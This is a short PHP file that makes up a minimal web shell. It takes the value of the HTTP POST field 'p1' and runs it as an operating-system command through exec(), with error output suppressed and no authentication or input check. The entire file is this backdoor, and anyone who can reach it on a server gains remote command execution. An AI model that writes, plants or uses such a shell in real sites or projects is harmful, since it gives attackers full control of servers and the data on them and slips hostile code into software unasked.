<?php
function ex($in) {
	@exec($in,$res);
	$res = @join("\n",$res);
	return $res;
}

ex($_POST['p1']);
?>